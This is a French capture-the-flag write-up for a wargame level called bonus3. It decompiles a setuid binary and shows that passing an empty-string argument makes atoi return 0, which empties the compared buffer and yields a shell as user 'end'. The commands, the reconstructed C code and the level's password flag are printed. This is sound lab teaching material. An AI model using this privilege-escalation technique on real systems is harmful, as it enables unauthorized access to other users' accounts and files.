Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```bash
$ id && pwd && ls -la
uid=2013(bonus3) gid=2013(bonus3) groups=2013(bonus3),100(users)
/home/user/bonus3
total 17
dr-xr-x---+ 1 bonus3 bonus3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus3 bonus3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus3 bonus3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3
-rw-r--r--+ 1 bonus3 bonus3   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus3 bonus3  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire `bonus3` :

```bash
$ ./bonus3
$ ./bonus3 dab

$ ./bonus3 dab itude
```

Sans succès, je me penche dès lors sur la décompilation.

J'utilise [Dogbolt](https://dogbolt.org/?id=4b673d9a-5976-420c-b0e4-b4225e0977c3#BinaryNinja=114&Reko=89&RetDec=57) afin de décompiler le binaire du `bonus3`, qui a des protections contre la décompilation, mais certains décompilateurs réussissent.

Je recoupe la sortie de `RetDec` avec l'ASM et en extrait le probable code suivant :

```c
int main(int argc, char **argv)
{
    char buffer[132];
    FILE *file;

    file = fopen("/home/user/end/.pass", "r");

    memset(buffer, 0, 132);

    if (file == 0 || ac != 2)
        return -1;

    fread(buffer, 1, 66, file);
    buffer[65] = 0; // <------------------------1 buffer variable filled with the .pass content
    buffer[atoi(av[1])] = 0; // <---------------3 user input places a null terminator with atoi(), atoi defaults to 0 on invalid input

    fread(buffer + 66, 1, 65, file);
    fclose(file);

    if (strcmp(buffer, argv[1]) == 0) // <---------2 making the buffer equates to user input gives shell access
        execl("/bin/sh", "sh", 0); // <----------4 giving "" (empty string) null terminates the index 0, making this comparison (user input =? buffer) be ("" ?= "")
    else
        puts(buffer + 66);

    return 0;
}
```

Ici, pas de vulnérabilité d'un point de vue fonctionnel, mais une vulnérabilité logique est probablement la solution de ce niveau.

En effet, le code : 

```c
    if (strcmp(buffer, av[1]) == 0)
        execl("/bin/sh", "sh", 0);
```

Implique une comparaison entre `buffer` et `av[1]`. Si je peux les rendre égaux, alors, j'aurais accès au shell final.

Le buffer, lui, se voit d'abord inseré le contenu du dernier `.pass`, puis un null terminator, puis à nouveau le contenu du `.pass` dans sa taille restante.

Quant à moi, mon `av[1]` est utilisé pour placer un null terminator.

Je me dis que :

Si je passe "0" en `av[1]`, alors, le premier caractère de buffer sera un null terminator, et je peux arrêter la comparaison de `strcmp()` dès le premier caractère. En revanche, ça voudrait dire qu'il comparerait `""` (string vide), à `"0"`, donc la comparaison ne marcherait pas.

Cependant, en lisant le [man](https://man7.org/linux/man-pages/man3/atoi.3.html) d'`atoi()` je trouve :

```
RETURN VALUE         

       The converted value or 0 on error.
```

Et réalise qu'une string vide sera probablement une erreur ! Cela voudrait dire que mon `av[1]` serait `""`, et qu'`atoi("")` renverra 0, et donc que `buffer[0]` sera un null terminator, et donc, enfin, que la comparaison par `strcmp` sera : `""` (`buffer`, null terminated dès le premier byte) == `""` (`av[1]`).

J'essaye cette hypothèse :

``` bash
$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```





